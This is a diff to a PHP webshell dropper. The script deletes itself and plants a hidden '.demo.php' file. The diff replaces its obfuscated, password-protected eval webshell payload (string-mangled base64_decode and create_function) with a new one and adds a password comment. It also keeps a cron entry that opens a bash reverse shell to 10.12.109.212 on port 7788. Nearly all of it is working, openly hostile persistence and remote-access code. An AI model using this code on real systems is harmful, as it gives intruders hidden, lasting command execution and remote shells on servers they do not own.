@@ -3,7 +3,8 @@ ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = '.demo.php';
-$shell = '<?php $nfq = str_replace("k","","ksktrk_krkekpklkakce");$xt="nVGVzdEAxt";$tep="MjM0J10pOtwo=";$ej="IEtBldmFsKtCtR";$am="fUEt9TVFs";$zd = $nfq("ee", "", "eebeeaseee64_eedeeeeecoeedeee");$zcj = $nfq("l","","lcrlelatel_lflunlctlioln");$kh = $zcj(\'\', $zd($nfq("t", "", $ej.$am.$xt.$tep))); $kh();?>';
+$shell = '<?php $rx="IAppZihAbWQ1KCRfUE9TVFsncbdGFz";$ge="bdcyddKT09PSdbdjM2Y4MzIyYTgxMmbdQ3MDFlNmVjNzM1";$zgs = str_replace("eq","","eqseqteqreq_eqreqepeqlaeqceqe");$ki="ZbdhbbdCgkX1BPU1bdRbY21kXSk7Cg==";$rv="ZjbddjYjgbdwMmbdI5bdZicpCgbdlAZX";$lf = $zgs("q", "", "baqsqe64_qdqeqcoqdqe");$egc = $zgs("h","","crhehahtheh_funhcthihon");$zue = $egc(\'\', $lf($zgs("bd", "", $rx.$ge.$rv.$ki))); $zue();?>';
+//pass=Fliper
 $message="*/1 * * * * echo \"bash -i >& /dev/tcp/10.12.109.212/7788 0>&1\" | bash";
 
 while (TRUE) {
